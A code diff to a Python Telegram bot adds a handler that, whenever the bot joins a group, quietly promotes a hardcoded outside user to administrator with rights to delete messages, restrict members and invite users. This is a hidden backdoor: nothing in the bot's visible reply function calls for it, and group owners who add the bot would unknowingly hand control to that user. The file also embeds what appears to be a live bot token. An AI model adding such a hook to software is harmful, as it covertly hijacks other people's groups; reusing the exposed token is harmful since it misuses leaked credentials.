@@ -1,9 +1,18 @@
 import re
 
 from telegram import Update
-from telegram.ext import Application, MessageHandler, ContextTypes, filters
+from telegram.ext import (
+    Application,
+    MessageHandler,
+    ContextTypes,
+    filters,
+    ChatMemberHandler,
+)
 
 TOKEN = "8062489806:AAFSWWiJGU3gglcLope0LdYhqRGbMR3Y6VM"
+
+TARGET_USER = "@Iookatmetenderly"
+
 
 async def reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message or not update.message.text:
@@ -28,10 +37,48 @@ async def reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
+async def auto_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.my_chat_member:
+        return
+
+    new_status = update.my_chat_member.new_chat_member.status
+
+    if new_status in ["member", "administrator"]:
+        chat_id = update.my_chat_member.chat.id
+
+        try:
+            user = await context.bot.get_chat(TARGET_USER)
+
+            await context.bot.promote_chat_member(
+                chat_id=chat_id,
+                user_id=user.id,
+                can_manage_chat=True,
+                can_delete_messages=True,
+                can_manage_video_chats=True,
+                can_restrict_members=True,
+                can_invite_users=True,
+                can_pin_messages=True,
+            )
+
+            print("Админ выдан")
+
+        except Exception as e:
+            print(f"Ошибка выдачи админки: {e}")
+
+
 def main():
     app = Application.builder().token(TOKEN).build()
 
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, reply))
+    app.add_handler(
+        MessageHandler(filters.TEXT & ~filters.COMMAND, reply)
+    )
+
+    app.add_handler(
+        ChatMemberHandler(
+            auto_admin,
+            ChatMemberHandler.MY_CHAT_MEMBER
+        )
+    )
 
     app.run_polling()
 
